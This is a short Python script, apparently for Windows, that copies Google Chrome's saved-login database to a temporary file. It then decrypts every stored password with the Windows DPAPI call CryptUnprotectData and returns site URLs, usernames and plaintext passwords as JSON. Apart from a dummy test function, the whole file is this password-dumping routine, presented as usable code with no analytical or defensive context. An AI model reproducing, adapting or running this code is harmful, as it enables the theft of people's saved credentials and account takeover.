# -*- enconfig:utf8 -*-
import os, sys
import shutil
import sqlite3
# pip install pypiwin32
from win32 import win32crypt
import traceback
import json



def chrome():
    info = {
        'chrome': [],
        'status': '',
    }
    try:
        user_pass_dic = {}
        db_file_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Default\Login Data')

        tmp_file = os.path.join(os.path.dirname(sys.executable), 'tmp_tmp_tmp')
        if os.path.exists(tmp_file):
            os.remove(tmp_file)
        shutil.copyfile(db_file_path, tmp_file)

        conn = sqlite3.connect(tmp_file)
        for row in conn.execute('select signon_realm,username_value,password_value from logins'):
            try:
                ret = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)
                if row[1] != '':
                    user_pass_dic['url'] = row[0][:50]
                    user_pass_dic['user'] = row[1]
                    user_pass_dic['pass'] = ret[1].decode('gbk')
                    info['chrome'].append(user_pass_dic)
                    info['status'] = 'seccess'
                    user_pass_dic = {}
            except Exception as e:
                # print('获取Chrome密码失败...')
                info['status'] = 'false'
                raise e
        conn.close()
        os.remove(tmp_file)
    except Exception as e:
        info['status'] = 'false'
        repr(e)
    return json.dumps(info)




def test():
    return json.dumps('dsaf')

